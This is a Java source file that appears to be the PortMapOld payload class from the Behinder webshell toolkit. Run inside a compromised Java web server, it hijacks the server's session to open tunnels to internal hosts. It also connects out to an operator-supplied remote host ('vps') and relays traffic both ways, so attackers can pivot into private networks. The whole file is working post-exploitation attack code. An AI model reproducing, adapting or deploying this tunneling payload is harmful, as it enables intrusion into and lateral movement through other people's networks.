package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.Map;
import java.util.Random;

public class PortMapOld implements Runnable {
   public static String action;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String remoteIP;
   public static String remotePort;
   public static String extraData;
   private Object Request;
   private Object Response;
   private Object Session;
   String localKey;
   String remoteKey;
   String type;
   Object httpSession;

   public boolean equals(Object obj) {
      try {
         this.fillContext(obj);
         this.portMap();
      } catch (Exception var3) {
      }

      return true;
   }

   private void createTunnel() throws Exception {
      String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
      String target = targetIP;
      int port = Integer.parseInt(targetPort);
      SocketChannel socketChannel = SocketChannel.open();
      socketChannel.connect(new InetSocketAddress(target, port));
      socketChannel.configureBlocking(false);
      this.sessionSetAttribute(this.Session, localSessionKey, socketChannel);
      this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
   }

   public void portMap() throws Exception {
      String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
      if (action.equals("createLocal")) {
         try {
            String target = targetIP;
            int port = Integer.parseInt(targetPort);
            SocketChannel socketChannel = SocketChannel.open();
            socketChannel.connect(new InetSocketAddress(target, port));
            socketChannel.configureBlocking(false);
            this.sessionSetAttribute(this.Session, localSessionKey, socketChannel);
            this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
         } catch (Exception var11) {
            Exception e = var11;

            try {
               Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
               Method write = so.getClass().getMethod("write", byte[].class);
               write.invoke(so, new byte[]{55, 33, 73, 54});
               write.invoke(so, e.getMessage().getBytes());
               so.getClass().getMethod("flush").invoke(so);
               so.getClass().getMethod("close").invoke(so);
            } catch (Exception var10) {
               var10.printStackTrace();
            }
         }
      } else {
         Method write;
         SocketChannel socketChannel;
         Exception e;
         Object so;
         ByteBuffer buf;
         if (action.equals("read")) {
            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
            if (socketChannel == null) {
               return;
            }

            try {
               socketChannel.configureBlocking(false);
               ByteArrayOutputStream bos = new ByteArrayOutputStream();
               buf = ByteBuffer.allocate(512);

               int length;
               for(length = socketChannel.read(buf); length > 0; length = socketChannel.read(buf)) {
                  System.out.println("bbbbb" + length);
                  byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
                  buf.clear();
                  bos.write(data);
               }

               if (length == -1) {
                  socketChannel.close();
                  System.out.println("socketChannel.isConnected():" + socketChannel.isConnected());
                  System.out.println("socketChannel.isOpen():" + socketChannel.isOpen());
                  this.createTunnel();
               }

               System.out.println("ccccc");
               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
               write = so.getClass().getMethod("write", byte[].class);
               write.invoke(so, bos.toByteArray());
               so.getClass().getMethod("flush").invoke(so);
               so.getClass().getMethod("close").invoke(so);
            } catch (Exception var12) {
               e = var12;
               var12.printStackTrace();
               this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);

               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, new byte[]{55, 33, 73, 54});
                  write.invoke(so, e.getMessage().getBytes());
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
                  socketChannel.socket().close();
               } catch (IOException var9) {
                  var9.printStackTrace();
               }
            }
         } else if (action.equals("write")) {
            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);

            try {
               byte[] extraDataByte = this.base64decode(extraData);
               buf = ByteBuffer.allocate(extraDataByte.length);
               buf.clear();
               buf.put(extraDataByte);
               buf.flip();

               while(buf.hasRemaining()) {
                  socketChannel.write(buf);
               }
            } catch (Exception var13) {
               e = var13;

               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, new byte[]{55, 33, 73, 54});
                  write.invoke(so, e.getMessage().getBytes());
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
                  socketChannel.socket().close();
               } catch (IOException var8) {
                  var8.printStackTrace();
               }
            }
         } else {
            Enumeration attributeNames;
            String attrName;
            if (action.equals("closeLocal")) {
               attributeNames = this.sessionGetAttributeNames(this.Session);

               while(attributeNames.hasMoreElements()) {
                  attrName = attributeNames.nextElement().toString();
                  if (attrName.startsWith("local_")) {
                     this.sessionRemoveAttribute(this.Session, attrName);
                  }
               }
            } else if (action.equals("createRemote")) {
               (new Thread(new PortMapOld(this.localKey, this.remoteKey, "create", this.Session))).start();
               this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
            } else if (action.equals("closeRemote")) {
               this.sessionSetAttribute(this.Session, "remoteRunning", false);
               attributeNames = this.sessionGetAttributeNames(this.Session);

               while(attributeNames.hasMoreElements()) {
                  attrName = attributeNames.nextElement().toString();
                  if (attrName.startsWith("remote")) {
                     this.sessionRemoveAttribute(this.Session, attrName);
                  }
               }
            }
         }
      }

   }

   public PortMapOld(String localKey, String remoteKey, String type, Object session) {
      this.localKey = localKey;
      this.remoteKey = remoteKey;
      this.httpSession = session;
      this.type = type;
   }

   public PortMapOld() {
   }

   public void run() {
      int bytesRead;
      if (this.type.equals("create")) {
         this.sessionSetAttribute(this.httpSession, "remoteRunning", true);

         while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
            try {
               String target = targetIP;
               int port = Integer.parseInt(targetPort);
               String vps = remoteIP;
               bytesRead = Integer.parseInt(remotePort);
               SocketChannel remoteSocketChannel = SocketChannel.open();
               remoteSocketChannel.connect(new InetSocketAddress(vps, bytesRead));
               String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
               this.sessionSetAttribute(this.httpSession, remoteKey, remoteSocketChannel);
               bytesRead = 0;
               ByteBuffer buf = ByteBuffer.allocate(512);
               if ((bytesRead = remoteSocketChannel.read(buf)) > 0) {
                  remoteSocketChannel.configureBlocking(true);
                  SocketChannel localSocketChannel = SocketChannel.open();
                  localSocketChannel.connect(new InetSocketAddress(target, port));
                  localSocketChannel.configureBlocking(true);
                  String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                  this.sessionSetAttribute(this.httpSession, localKey, localSocketChannel);
                  localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
                  (new Thread(new PortMapOld(localKey, remoteKey, "read", this.httpSession))).start();
                  (new Thread(new PortMapOld(localKey, remoteKey, "write", this.httpSession))).start();
               }
            } catch (Exception var13) {
               var13.printStackTrace();
            }
         }
      } else {
         SocketChannel localSocketChannel;
         SocketChannel remoteSocketChannel;
         ByteBuffer buf;
         OutputStream so;
         if (!this.type.equals("read")) {
            if (this.type.equals("write")) {
               while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
                  try {
                     localSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.localKey);
                     remoteSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.remoteKey);
                     buf = ByteBuffer.allocate(512);
                     bytesRead = remoteSocketChannel.read(buf);

                     for(so = localSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = remoteSocketChannel.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                     }

                     so.flush();
                     so.close();
                  } catch (IOException var14) {
                     try {
                        Thread.sleep(10L);
                     } catch (Exception var11) {
                     }
                  }
               }
            }
         } else {
            while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
               try {
                  localSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.localKey);
                  remoteSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.remoteKey);
                  buf = ByteBuffer.allocate(512);
                  bytesRead = localSocketChannel.read(buf);

                  for(so = remoteSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = localSocketChannel.read(buf)) {
                     so.write(buf.array(), 0, bytesRead);
                     so.flush();
                     buf.clear();
                  }

                  so.flush();
                  so.close();
               } catch (IOException var15) {
                  try {
                     Thread.sleep(10L);
                  } catch (Exception var12) {
                  }
               }
            }
         }
      }

   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }

   private void doOutPut(Object response, byte[] data) throws Exception {
      Object so = response.getClass().getMethod("getOutputStream").invoke(response);
      Method write = so.getClass().getMethod("write", byte[].class);
      write.invoke(so, data);
      so.getClass().getMethod("flush").invoke(so);
      so.getClass().getMethod("close").invoke(so);
   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
